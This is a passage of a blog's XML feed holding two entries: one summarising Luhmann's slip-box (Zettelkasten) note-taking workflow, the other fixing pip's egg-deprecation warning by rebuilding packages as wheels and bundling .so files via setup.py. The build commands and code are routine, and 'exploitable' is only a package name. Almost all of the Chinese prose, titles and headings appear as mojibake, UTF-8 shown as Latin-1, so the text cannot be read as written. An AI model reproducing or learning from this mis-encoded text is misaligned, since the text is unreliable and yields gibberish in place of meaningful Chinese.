title="å¤šä¸ªç‹¬ç«‹ä¿¡æ¯æºï¼Œäº¤å‰éªŒè¯"></a>å¤šä¸ªç‹¬ç«‹ä¿¡æ¯æºï¼Œäº¤å‰éªŒè¯</h2><p>è¿™ç‚¹æ˜¯æˆ‘è¡¥å……çš„ï¼Œç‹¬ç«‹ä¿¡æ¯æºå¾ˆé‡è¦ï¼Œæœ‰äº›æ—¶å€™å¤šä¸ªåœ°æ–¹çš„ä¿¡æ¯å…¶å®æ¥è‡ªåŒä¸€ä¸ªä¿¡æ¯æºï¼Œè¿™æ ·çš„ä¿¡æ¯ä»ç„¶æ˜¯ä¸å¯é çš„ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¡ç‰‡ç›’ç¬”è®°æ³•æ€»ä½“æ€è·¯ä¸å·¥ä½œæµ</title>
    <link href="/cn/zel_note_flow/"/>
    <url>/cn/zel_note_flow/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘ç»å¸¸åœ¨å°‘æ•°æ´¾ç­‰ç½‘ç«™ä¸Šçœ‹åˆ°å¡ç‰‡ç›’ç¬”è®°çš„æ–‡ç« ï¼Œè¿™äº›æ–‡ç« å°‘åˆ™å‡ åƒå­—ï¼Œå¤šåˆ™ä¸Šä¸‡å­—ã€‚è¿‡äºå¤æ‚çš„æ–¹æ³•æ˜¯å¾ˆéš¾å®è·µçš„ï¼Œæˆ‘å°è¯•ç”¨ä¸€ç§ç®€å•çš„æ–¹æ³•æŠŠå¡ç‰‡ç›’ç¬”è®°æ³•è¯´æ¸…æ¥šï¼Œå¸Œæœ›èƒ½ç»™å¤§å®¶å¸¦æ¥ä¸€äº›å¸®åŠ©ã€‚</p><h2 id="å¡ç‰‡ç›’ç¬”è®°æ³•æ ¸å¿ƒè¦ä¹‰"><a href="#å¡ç‰‡ç›’ç¬”è®°æ³•æ ¸å¿ƒè¦ä¹‰" class="headerlink" title="å¡ç‰‡ç›’ç¬”è®°æ³•æ ¸å¿ƒè¦ä¹‰"></a>å¡ç‰‡ç›’ç¬”è®°æ³•æ ¸å¿ƒè¦ä¹‰</h2><p>1ï¼‰ç”¨è‡ªå·±çš„è¯è®°å½•æœ€æ„Ÿå…´è¶£ï¼Œæœ€æœ‰ç”¨çš„çŸ¥è¯†ï¼Œè®°å½•è‡ªå·±çš„æ´è§ï¼Œè€Œä¸æ˜¯å•çº¯è®°å½•ä¿¡æ¯<br>2ï¼‰å¤„ç†å„ç§æƒ³æ³•ï¼Œæ¢å¯»æƒ³æ³•ä¹‹é—´çš„å…³è”ã€å†²çªã€æ‹“å±•ï¼Œå»ºç«‹æˆç†Ÿçš„æƒ³æ³•é›†ç¾¤ï¼Œå¹¶å’Œå…¶ä»–çš„æƒ³æ³•é›†ç¾¤è”ç³»åœ¨ä¸€èµ·<br>3) é’ˆå¯¹é¡¹ç›®æˆ–ä¸»é¢˜è°ƒæ•´ç¬”è®°é¡ºåºï¼Œæ ¹æ®ç¬”è®°çš„é‚»è¿‘åº¦èšåˆä¸åŒçš„æƒ³æ³•ï¼Œä»æ›´é«˜çš„æ€ç»´å±‚æ¬¡ä¸Šå®Œæˆå„ä¸ªæƒ³æ³•çš„å†æ‹¼å›¾</p><h2 id="å¡ç‰‡ç›’ç¬”è®°æ³•çš„å…³é”®æ€è·¯"><a href="#å¡ç‰‡ç›’ç¬”è®°æ³•çš„å…³é”®æ€è·¯" class="headerlink" title="å¡ç‰‡ç›’ç¬”è®°æ³•çš„å…³é”®æ€è·¯"></a>å¡ç‰‡ç›’ç¬”è®°æ³•çš„å…³é”®æ€è·¯</h2><p>å¢æ›¼çš„å¡ç‰‡ç›’ç¬”è®°ç³»ç»Ÿä¸ä½¿ç”¨é¢„å…ˆè®¾å®šçš„ç³»ç»Ÿçš„æ¬¡åºï¼Œä¸æŒ‰ç…§ä¸»é¢˜ã€å­ä¸»é¢˜çš„æ–¹å¼å­˜æ”¾ç¬”è®°ï¼Œè€Œæ˜¯ä½¿ç”¨å›ºå®šç¼–å·çš„ç³»ç»Ÿç»“æ„ã€‚</p><ul><li>å¢æ›¼è®¤ä¸ºå¡ç‰‡ç›’ç¬”è®°ç³»ç»Ÿå’Œæˆ‘ä»¬è‡ªå·±æ˜¯ä¸æ–­å‘å±•çš„ï¼Œä¸å¯èƒ½æå‰å‡ åå¹´å°±æŠŠç¬”è®°æŸç¼šåœ¨æŸä¸ªæ¬¡åºä¸Šã€‚</li><li>ä½¿ç”¨å›ºå®šç¼–å·çš„æ–¹æ³•ï¼Œå°†å‡å°‘æˆ‘ä»¬å®‰æ’ç¬”è®°ä½ç½®çš„å¤æ‚æ€§ï¼Œä½¿æˆ‘ä»¬å¯ä»¥åˆ›é€ é«˜åº¦å¤æ‚çš„ç¬”è®°å¡ç‰‡ã€‚</li><li>ä½¿ç”¨å›ºå®šç¼–å·æ˜¯ä»»æ„åŸºäºå†…å®¹çš„ç³»ç»Ÿç»“æ„çš„æŠ½è±¡ï¼Œå°†ä½¿æˆ‘ä»¬çš„å¡ç‰‡å’Œç¬”è®°ç³»ç»Ÿè¾¾åˆ°ä¸€ä¸ªæ›´é«˜ç±»å‹çš„ç§©åºã€‚</li></ul><p>å¢æ›¼çš„å¡ç‰‡ç›’ç¬”è®°ç³»ç»Ÿä½¿ç”¨å›ºå®šç¼–å·çš„æ–¹æ³•æ ‡è®°å”¯ä¸€çš„ä¸€æ¡ç¬”è®°ï¼Œè¿™ç§ç¼–å·ç³»ç»Ÿæœ‰å¾ˆå¤§çš„ä¼˜åŠ¿ã€‚</p><ul><li>å›ºå®šç¼–å·ä½¿ç¬”è®°ä¹‹é—´èƒ½å¤Ÿç›¸äº’è¿æ¥</li><li>å›ºå®šç¼–å·ä½¿ç¬”è®°èƒ½å¤Ÿä»»æ„çš„å†…éƒ¨åˆ†å‰ (internal branching)ï¼Œå†…éƒ¨ç”Ÿé•¿ (internal growth)</li></ul><hr><ul><li>57&#x2F;12<ul><li>57&#x2F;12a<ul><li>57&#x2F;12a1</li><li>57&#x2F;12a2</li></ul></li><li>57&#x2F;12b</li></ul></li><li>57&#x2F;13</li></ul><hr><p>ç”±äºç¼ºä¹ç³»ç»Ÿçš„é¡ºåºï¼Œéœ€è¦ç»´æŠ¤å…³é”®å­—ç™»è®°å†Œï¼ˆRegisterï¼‰ï¼Œç™»è®°å†Œç”¨äºæŸ¥æ‰¾ç¬”è®°ï¼Œå›ºå®šç¼–å·å¯¹äºç™»è®°å†Œæ¥è¯´æ˜¯ä¸å¯æˆ–ç¼ºçš„ã€‚(è¿™é‡Œè¯´çš„ç™»è®°å†Œç›¸å½“äºç´¢å¼•å¡ç‰‡)</p><h2 id="å››ç§ä¸åŒç±»å‹ç¬”è®°"><a href="#å››ç§ä¸åŒç±»å‹ç¬”è®°" class="headerlink" title="å››ç§ä¸åŒç±»å‹ç¬”è®°"></a>å››ç§ä¸åŒç±»å‹ç¬”è®°</h2><p>é—ªå¿µç¬”è®° ( fleeting notes )ï¼Œè®°å½•è„‘æµ·ä¸­é—ªè¿‡çš„æƒ³æ³• ï¼ˆå¿…é¡»æ‹¥æœ‰éšæ—¶è®°å½•æƒ³æ³•çš„å·¥å…·ï¼‰</p><p>æ–‡çŒ®ç¬”è®° ( literature notes )ï¼Œé˜…è¯»èµ„æ–™éƒ½è¦è®°ç¬”è®°ï¼Œç”¨è‡ªå·±çš„è¯è®°ç®€è¦è®°å½•ä¸æƒ³é—å¿˜çš„ã€æ„Ÿå…´è¶£çš„å†…å®¹ã€‚</p><ul><li>å†…å®¹è¦ç²¾å¿ƒé€‰æ‹©ï¼Œå¼•æ–‡è¦æ ¼å¤–æŒ‘å‰”</li><li>è®°å½•å‚è€ƒèµ„æ–™çš„ç»†èŠ‚ï¼Œåˆ©äºåæœŸè·Ÿè¸ªå›é¡¾</li></ul><p>æ°¸ä¹…ç¬”è®° ( permanent notes )ï¼Œå‚è€ƒå‰ä¸¤ç±»ç¬”è®°ï¼Œç”¨å®Œæ•´çš„å¥å­å‡†ç¡®è®°å½•æ–°çš„æƒ³æ³•</p><ul><li>æ€è€ƒå‰ä¸¤ç±»ç¬”è®°å’Œè‡ªå·±çš„ç ”ç©¶ã€æ„Ÿå…´è¶£çš„å†…å®¹ï¼Œå’Œè¿‘æœŸçš„æ€è€ƒæ˜¯å¦æœ‰å…³è”</li><li>æ–°è¾“å…¥çš„ä¿¡æ¯æ˜¯å¦å’Œä»¥å‰è®°å½•çš„ä¿¡æ¯æˆ–è€…è„‘æµ·é‡Œçš„æƒ³æ³•æœ‰çŸ›ç›¾ï¼Œäº’ç›¸å°è¯ï¼Œæˆ–è€…äº§ç”Ÿäº†æ–°çš„æƒ³æ³•ã€‚æ–°æƒ³æ³•æ˜¯å¦åˆå¼•å‡ºäº†ä»€ä¹ˆæ–°é—®é¢˜ï¼Ÿ</li><li>ç”¨å®Œæ•´çš„å¥å­å‡†ç¡®è®°å½•æ–°çš„æƒ³æ³•ï¼Œæ ‡æ³¨æ¥æºå’Œå‚è€ƒèµ„æ–™ï¼Œåšåˆ°ç²¾ç¡®ã€æ¸…æ™°ã€ç®€çŸ­ã€‚</li></ul><p>é¡¹ç›®ç¬”è®° ( project notes ), é¡¹ç›®ç¬”è®°åªå’ŒæŸä¸ªç‰¹å®šçš„é¡¹ç›®æœ‰å…³ï¼Œé¡¹ç›®ç»“æŸåå¯ä»¥å½’æ¡£æˆ–è€…ä¸¢å¼ƒ</p><ul><li>å¾…åŠäº‹é¡¹ã€å¤‡å¿˜å½•ã€æ–‡çŒ®æ”¶é›†ã€è‰ç¨¿ç‰‡æ®µå’Œæ‰‹ç¨¿è¯„è®ºç­‰</li></ul><h2 id="å››ç§ä¸åŒç±»å‹çš„ç´¢å¼•å¡ç‰‡"><a href="#å››ç§ä¸åŒç±»å‹çš„ç´¢å¼•å¡ç‰‡" class="headerlink" title="å››ç§ä¸åŒç±»å‹çš„ç´¢å¼•å¡ç‰‡"></a>å››ç§ä¸åŒç±»å‹çš„ç´¢å¼•å¡ç‰‡</h2><ul><li>ä¸»é¢˜ç´¢å¼•ï¼Œæ±‡é›†æ‰€æœ‰ä¸»é¢˜ç›¸å…³çš„ç¬”è®°ï¼Œæ¯æ¡ç¬”è®°ç”¨å‡ ä¸ªå…³é”®è¯ç®€è¦è¯´æ˜æ ¸å¿ƒå†…å®¹</li><li>å¡ç‰‡ç´¢å¼•ï¼Œé€»è¾‘ç›¸å…³ç¬”è®°çš„å‰ä¸€æ¡å’Œåä¸€æ¡ï¼Œè¿™äº›ç¬”è®°å¯èƒ½å¹¶ä¸ç›¸äº’é‚»è¿‘</li><li>å…³è”ç´¢å¼•ï¼Œä½ç½®ç›¸è¿‘çš„ä¸åŒä¸»é¢˜çš„æ¦‚è§ˆï¼Œè¿™äº›ç¬”è®°å¯èƒ½å…·æœ‰ç›¸åŒçš„æŸä¸ªæ›´å¤§ä¸»é¢˜</li><li>åŒå‘ç´¢å¼•ï¼Œä¸¤æ¡ç¬”è®°å¯ä»¥å®Œå…¨æ²¡æœ‰å…³ç³»ï¼Œå…³è”åˆ°ä¸€èµ·å´æœ‰å¯èƒ½å‡ºç°é¢„æƒ³ä¸åˆ°çš„æ•ˆæœ</li></ul><h2 id="å¡ç‰‡ç›’ç¬”è®°æ³•å·¥ä½œæµ-workflow"><a href="#å¡ç‰‡ç›’ç¬”è®°æ³•å·¥ä½œæµ-workflow" class="headerlink" title="å¡ç‰‡ç›’ç¬”è®°æ³•å·¥ä½œæµ (workflow)"></a>å¡ç‰‡ç›’ç¬”è®°æ³•å·¥ä½œæµ (workflow)</h2><h3 id="æ­¥éª¤1ï¼šæ”¶é›†èµ„æ–™ï¼Œå†™èµ„æºç¬”è®°"><a href="#æ­¥éª¤1ï¼šæ”¶é›†èµ„æ–™ï¼Œå†™èµ„æºç¬”è®°" class="headerlink" title="æ­¥éª¤1ï¼šæ”¶é›†èµ„æ–™ï¼Œå†™èµ„æºç¬”è®°"></a>æ­¥éª¤1ï¼šæ”¶é›†èµ„æ–™ï¼Œå†™èµ„æºç¬”è®°</h3><ul><li>å…³æ³¨ P.A.R.A é‡Œ Areas é‡Œçš„é¢†åŸŸå’Œ Resources é‡Œæ„Ÿå…´è¶£ä¸»é¢˜ç›¸å…³çš„ä¹¦ç±ã€æ–‡ç« ã€è®ºæ–‡ç­‰èµ„æ–™ï¼Œå°†ä»–ä»¬ä¿å­˜åˆ°èµ„æ–™åº“</li><li>ä¸€ä»½èµ„æ–™å†™ä¸€æ¡èµ„æºç¬”è®° (block)ï¼Œåœ¨èµ„æºç¬”è®°ä¸­é“¾æ¥åŸå§‹å‡ºå¤„</li></ul><h3 id="æ­¥éª¤2ï¼šæ•æ‰çµæ„Ÿï¼Œå†™é—ªå¿µç¬”è®°"><a href="#æ­¥éª¤2ï¼šæ•æ‰çµæ„Ÿï¼Œå†™é—ªå¿µç¬”è®°" class="headerlink" title="æ­¥éª¤2ï¼šæ•æ‰çµæ„Ÿï¼Œå†™é—ªå¿µç¬”è®°"></a>æ­¥éª¤2ï¼šæ•æ‰çµæ„Ÿï¼Œå†™é—ªå¿µç¬”è®°</h3><ul><li>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¿«é€Ÿç¬”è®°è½¯ä»¶ç®€è¦è®°å½•é£é€çš„çµæ„Ÿï¼Œåœ¨æ—¶é—´ç´§è¿«çš„æƒ…å†µä¸‹å¯ä»¥åªè®°å½•å…³é”®å­—ã€‚</li></ul><h3 id="æ­¥éª¤3ï¼šé˜…è¯»èµ„æ–™ï¼Œå†™å¼•æ–‡ç¬”è®°"><a href="#æ­¥éª¤3ï¼šé˜…è¯»èµ„æ–™ï¼Œå†™å¼•æ–‡ç¬”è®°" class="headerlink" title="æ­¥éª¤3ï¼šé˜…è¯»èµ„æ–™ï¼Œå†™å¼•æ–‡ç¬”è®°"></a>æ­¥éª¤3ï¼šé˜…è¯»èµ„æ–™ï¼Œå†™å¼•æ–‡ç¬”è®°</h3><ul><li>æˆ‘ä»¬åœ¨é˜…è¯»èµ„æ–™æ—¶ä¸ºæ¯ä¸€ä»½èµ„æºåˆ›å»ºä¸€ä¸ªé¡µé¢ (page)ï¼Œåœ¨è¿™ä¸ªé¡µé¢ä¸­é“¾æ¥åŸå§‹çš„èµ„æºç¬”è®°</li><li>åœ¨é˜…è¯»èµ„æ–™æ—¶å°†æ„Ÿå…´è¶£çš„å¼•æ–‡åŠ ç²— ï¼Œå°†åŠ ç²—åçš„å¼•æ–‡ä¿å­˜åœ¨ä¸ºèµ„æ–™åˆ›å»ºçš„çš„é¡µé¢é‡Œ</li><li>åœ¨é˜…è¯»èµ„æ–™æ—¶å°†æœ€å¥½çš„å¼•æ–‡é«˜äº®ï¼Œè¿™æ ·çš„å¼•æ–‡æ˜¯åŠ ç²—çš„å¹¶ä¸”æ˜¯é«˜äº®çš„</li></ul><h3 id="æ­¥éª¤4ï¼šå‚è€ƒå¼•æ–‡ç¬”è®°ï¼Œå†™æ–‡çŒ®ç¬”è®°"><a href="#æ­¥éª¤4ï¼šå‚è€ƒå¼•æ–‡ç¬”è®°ï¼Œå†™æ–‡çŒ®ç¬”è®°" class="headerlink" title="æ­¥éª¤4ï¼šå‚è€ƒå¼•æ–‡ç¬”è®°ï¼Œå†™æ–‡çŒ®ç¬”è®°"></a>æ­¥éª¤4ï¼šå‚è€ƒå¼•æ–‡ç¬”è®°ï¼Œå†™æ–‡çŒ®ç¬”è®°</h3><ul><li>å‚è€ƒå¼•æ–‡ç¬”è®°å†™æ–‡çŒ®ç¬”è®°ï¼Œåšåˆ°ç²¾ç®€æ‘˜è¦çš„æ ¸å¿ƒåŸåˆ™ï¼šåŸå­åŸåˆ™ï¼Œç”¨è‡ªå·±çš„è¯ï¼Œä¿ç•™ä¸Šä¸‹æ–‡</li><li>å°†æ–‡çŒ®ç¬”è®°å’Œå‚è€ƒçš„å¼•æ–‡åŸæ–‡ block åšè¿æ¥</li></ul><h3 id="æ­¥éª¤5ï¼šå‚è€ƒé—ªå¿µç¬”è®°å’Œæ–‡çŒ®ç¬”è®°ï¼Œå†™æ°¸ä¹…ç¬”è®°"><a href="#æ­¥éª¤5ï¼šå‚è€ƒé—ªå¿µç¬”è®°å’Œæ–‡çŒ®ç¬”è®°ï¼Œå†™æ°¸ä¹…ç¬”è®°" class="headerlink" title="æ­¥éª¤5ï¼šå‚è€ƒé—ªå¿µç¬”è®°å’Œæ–‡çŒ®ç¬”è®°ï¼Œå†™æ°¸ä¹…ç¬”è®°"></a>æ­¥éª¤5ï¼šå‚è€ƒé—ªå¿µç¬”è®°å’Œæ–‡çŒ®ç¬”è®°ï¼Œå†™æ°¸ä¹…ç¬”è®°</h3><ul><li>å‚è€ƒé—ªå¿µç¬”è®°å’Œæ–‡çŒ®ç¬”è®°å†™æ°¸ä¹…ç¬”è®°ï¼Œæ°¸ä¹…ç¬”è®°éœ€è¦ç”¨å®Œæ•´çš„å¥å­è®°å½•æ–°çš„æƒ³æ³• (æ´è§)ã€‚</li><li>å°†æ°¸ä¹…ç¬”è®°å’Œæ–‡çŒ®ç¬”è®°åšé“¾æ¥ï¼Œå°†æ°¸ä¹…ç¬”è®°å’Œå…¶ä»–æ°¸ä¹…ç¬”è®°åšé“¾æ¥</li><li>å¦‚æœå†™æ°¸ä¹…ç¬”è®°æ—¶å‚è€ƒäº†é—ªå¿µç¬”è®°ï¼Œå°†é—ªå¿µç¬”è®°å½’æ¡£æˆ–è€…åˆ é™¤</li></ul><h3 id="æ­¥éª¤6ï¼šå‚è€ƒæ°¸ä¹…ç¬”è®°ï¼Œå†™-MOCs-ç¬”è®°"><a href="#æ­¥éª¤6ï¼šå‚è€ƒæ°¸ä¹…ç¬”è®°ï¼Œå†™-MOCs-ç¬”è®°" class="headerlink" title="æ­¥éª¤6ï¼šå‚è€ƒæ°¸ä¹…ç¬”è®°ï¼Œå†™ MOCs ç¬”è®°"></a>æ­¥éª¤6ï¼šå‚è€ƒæ°¸ä¹…ç¬”è®°ï¼Œå†™ MOCs ç¬”è®°</h3><ul><li>å½“æ°¸ä¹…ç¬”è®°ç§¯ç´¯åˆ°ä¸€å®šæ•°é‡ï¼ŒåŸºäºæ°¸ä¹…ç¬”è®°çš„å†…å®¹é‚»è¿‘åº¦ä½¿ç”¨ MOCs è‡ªé¡¶å‘ä¸‹ç»„ç»‡ç›¸å…³å†…å®¹</li></ul><h3 id="æ­¥éª¤7ï¼šå®šæœŸæ¼«æ¸¸ç¬”è®°-Random-Notes"><a href="#æ­¥éª¤7ï¼šå®šæœŸæ¼«æ¸¸ç¬”è®°-Random-Notes" class="headerlink" title="æ­¥éª¤7ï¼šå®šæœŸæ¼«æ¸¸ç¬”è®° (Random Notes)"></a>æ­¥éª¤7ï¼šå®šæœŸæ¼«æ¸¸ç¬”è®° (Random Notes)</h3><ul><li>åœ¨æ¼«æ¸¸ç¬”è®°è¿‡ç¨‹ä¸­ç”¨æ–°è§†è§’å»å®¡è§†æ—§æƒ³æ³•ï¼Œä¸æ–­è¿­ä»£è‡ªå·²çš„æƒ³æ³•ï¼Œèºæ—‹å‰è¿›ã€‚</li></ul><h3 id="æ­¥éª¤8ï¼šå®šæœŸåˆ¶ä½œç´¢å¼•å¡ç‰‡"><a href="#æ­¥éª¤8ï¼šå®šæœŸåˆ¶ä½œç´¢å¼•å¡ç‰‡" class="headerlink" title="æ­¥éª¤8ï¼šå®šæœŸåˆ¶ä½œç´¢å¼•å¡ç‰‡"></a>æ­¥éª¤8ï¼šå®šæœŸåˆ¶ä½œç´¢å¼•å¡ç‰‡</h3><ul><li>ä¸ºäº†èƒ½å¤Ÿæ–¹ä¾¿çš„ç´¢å¼•æˆ‘ä»¬çš„ç¬”è®°ï¼Œéœ€è¦åˆ¶ä½œç´¢å¼•å¡ç‰‡ï¼ŒæŒ‰ç…§ä¸åŒçš„ä¸»é¢˜æ•´ç†ã€‚</li></ul><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ol><li><p>å®šæœŸå›é¡¾ç¬”è®°çš„å¥½å¤„<br><a href="https://www.usmacd.com/cn/note_review/">https://www.usmacd.com/cn/note_review/</a></p></li><li><p>å…³äºç¬”è®°çš„ä¸€äº›æ€è€ƒ<br><a href="https://www.usmacd.com/cn/note/">https://www.usmacd.com/cn/note/</a></p></li><li><p>Communicating with slip boxes - Niklas Luhmann<br><a href="https://luhmann.surge.sh/communicating-with-slip-boxes">https://luhmann.surge.sh/communicating-with-slip-boxes</a></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python3 pip loading egg is deprecated è­¦å‘Šçš„è§£å†³æ–¹æ³•</title>
    <link href="/cn/egg-is-deprecated/"/>
    <url>/cn/egg-is-deprecated/</url>
    
    <content type="html"><![CDATA[<h2 id="è§£å†³-egg-is-deprecation-è­¦å‘Š"><a href="#è§£å†³-egg-is-deprecation-è­¦å‘Š" class="headerlink" title="è§£å†³ egg is deprecation è­¦å‘Š"></a>è§£å†³ egg is deprecation è­¦å‘Š</h2><p>python3 -m pip install some_package æ—¶å‘ç° exploitable æœ‰è­¦å‘Šï¼š</p><blockquote><p>DEPRECATION: Loading egg at exploitable-1.32-py3.12.egg is deprecated. pip 24.3 will enforce this behaviour change. A possible replacement is to use pip for package installation.<br>Discussion can be found at <a href="https://github.com/pypa/pip/issues/12330">https://github.com/pypa/pip/issues/12330</a></p></blockquote><p>pip 24.3 å°†åºŸå¼ƒ egg å½¢å¼çš„ python package, æ ¹æ® github issue [1] çš„ä¿¡æ¯ pip 24.3 å°†åœ¨ October 2024 å‘å¸ƒã€‚å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•ï¼Œè¦å»æ‰ä¸Šé¢çš„è­¦å‘Šä¿¡æ¯ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh"><br><span class="hljs-built_in">cd</span> exploitable_src_dir<br><br><span class="hljs-comment"># åˆ é™¤è€çš„ build ç»“æœ</span><br><span class="hljs-built_in">rm</span> -rf build dist htmlcov *.egg-info<br><br><span class="hljs-comment"># å‡çº§ pip</span><br>python3 -m pip install --upgrade build<br><br><span class="hljs-comment"># é‡æ–° build</span><br>python3 -m build --wheel<br><br><span class="hljs-comment"># ä½¿ç”¨ wheel çš„æ–¹å¼å®‰è£…</span><br>python3 -m pip install . --user<br><br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸ç”¨é‡æ–°å†™ pyproject.toml ï¼Œæ‰§è¡Œä¸Šé¢å‘½ä»¤å°±å¯ä»¥äº†ã€‚</p><h2 id="åœ¨-Wheel-ä¸­æ·»åŠ äºŒè¿›åˆ¶æ–‡ä»¶çš„æ–¹æ³•"><a href="#åœ¨-Wheel-ä¸­æ·»åŠ äºŒè¿›åˆ¶æ–‡ä»¶çš„æ–¹æ³•" class="headerlink" title="åœ¨ Wheel ä¸­æ·»åŠ äºŒè¿›åˆ¶æ–‡ä»¶çš„æ–¹æ³•"></a>åœ¨ Wheel ä¸­æ·»åŠ äºŒè¿›åˆ¶æ–‡ä»¶çš„æ–¹æ³•</h2><p>æ ¹æ®python å®˜æ–¹çš„æ–‡æ¡£ï¼ŒMANIFEST.in åªå¯¹ source distributions (sdist) èµ·ä½œç”¨ã€‚</p><blockquote><p>MANIFEST.in does not affect binary distributions such as wheels.</p></blockquote><p>è¦æƒ³ç»™ wheel æ·»åŠ éçº¯ python çš„æ–‡ä»¶ï¼Œæœ‰ä¸€äº›å›°éš¾ï¼Œä¸»è¦æ˜¯ä¸€äº›ä½¿ç”¨ Extension çš„ Python Package ä¼šé‡ä¸Šè¿™ä¸ªé—®é¢˜ã€‚é€šè¿‡ç ”ç©¶å‘ç°ï¼Œå¯ä»¥æ§åˆ¶ <code>setup.py bdist_wheel</code> çš„å‚æ•°è¾¾åˆ°æ‰“åŒ…so æ–‡ä»¶çš„æ•ˆæœã€‚</p><p>æ‰§è¡Œ <code>python3 setup.py bdist_wheel --help</code> ï¼Œå¯ä»¥çœ‹åˆ°è¯¦ç»†çš„å‚æ•°ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">Options <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;bdist_wheel&#x27;</span> command:<br>  <span class="hljs-comment">--bdist-dir (-b)  temporary directory for creating the distribution</span><br>  <span class="hljs-comment">--plat-name (-p)  platform name to embed in generated filenames (default:</span><br>                    linux_x86_64)<br>  <span class="hljs-comment">--keep-temp (-k)  keep the pseudo-installation tree around after creating</span><br>                    the distribution archive<br>  <span class="hljs-comment">--dist-dir (-d)   directory to put final built distributions in</span><br>  <span class="hljs-comment">--skip-build      skip rebuilding everything (for testing/debugging)</span><br>  <span class="hljs-comment">--relative        build the archive using relative paths (default: false)</span><br>  <span class="hljs-comment">--owner (-u)      Owner name used when creating a tar file [default: current</span><br>                    <span class="hljs-keyword">user</span>]<br>  <span class="hljs-comment">--group (-g)      Group name used when creating a tar file [default: current</span><br>                    <span class="hljs-keyword">group</span>]<br>  <span class="hljs-comment">--universal       make a universal wheel (default: false)</span><br>  <span class="hljs-comment">--compression     zipfile compression (one of: stored, deflated) (default:</span><br>                    <span class="hljs-string">&#x27;deflated&#x27;</span>)<br>  <span class="hljs-comment">--python-tag      Python implementation compatibility tag (default: &#x27;py3&#x27;)</span><br>  <span class="hljs-comment">--build-number    Build number for this particular version. As specified in</span><br>                    PEP<span class="hljs-number">-0427</span>, this must <span class="hljs-keyword">start</span> <span class="hljs-keyword">with</span> a digit. [<span class="hljs-keyword">default</span>: <span class="hljs-keyword">None</span>]<br>  <span class="hljs-comment">--py-limited-api  Python tag (cp32|cp33|cpNN) for abi3 wheel tag (default:</span><br>                    <span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<code>--bdist-dir</code> å‚æ•°ï¼Œä¿®æ”¹ç”Ÿæˆwheel distributions çš„ç›®å½•å¯ä»¥è¾¾åˆ°ç›®çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, Extension, find_packages<br><br>lib_name = Extension()<br>setup(name=<span class="hljs-string">&#x27;package_name&#x27;</span>,<br>      packages=find_packages(),<br>      package_data=&#123;<span class="hljs-string">&#x27;&#x27;</span>: [<span class="hljs-string">&#x27;*.so&#x27;</span>]&#125;,<br>      include_package_data=<span class="hljs-literal">True</span>,<br>      ...,<br>      ext_modules=[lib_name],<br>      options=&#123;<br>          <span class="hljs-string">&#x27;bdist_wheel&#x27;</span>: &#123;<span class="hljs-string">&#x27;python_tag&#x27;</span>: <span class="hljs-string">&#x27;cp30&#x27;</span>, <span class="hljs-string">&#x27;py_limited_api&#x27;</span>: <span class="hljs-string">&#x27;cp32&#x27;</span>, <span class="hljs-string">&#x27;bdist_dir&#x27;</span>: <span class="hljs-string">&#x27;build&#x27;</span>&#125;,<br>          <span class="hljs-string">&#x27;build_ext&#x27;</span>: &#123;<span class="hljs-string">&#x27;build_lib&#x27;</span>: <span class="hljs-string">&#x27;build/package_name&#x27;</span>&#125;,<br>      &#125;<br>)<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ setup.py åï¼Œé‡æ–°æ‰§è¡Œ <code>python3 -m build --wheel</code> å³å¯ã€‚</p><h2 id="å‚è€ƒä¿¡æ¯"><a href="#å‚è€ƒä¿¡æ¯" class="headerlink" title="å‚è€ƒä¿¡æ¯"></a>å‚è€ƒä¿¡æ¯</h2><p>[1] <a href="https://github.com/pypa/pip/issues/12330">Remove support for installed .egg distributions</a><br>[2] <a href="https://packaging.python.org/en/latest/tutorials/packaging-projects/#uploading-your-project-to-pypi">Packaging Python Projects</a><br>[3] <a href="https://docs.python.org/3.11/distutils/setupscript.html">Writing the Setup Script</a><br>[4] <a href="https://packaging.python.org/en/latest/guides/distributing-packages-using-setuptools/">Packaging and distributing projects</a><br>[5] <a href="https://buildmedia.readthedocs.org/media/pdf/wheel/stable/wheel.pdf">wheel Documentation</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
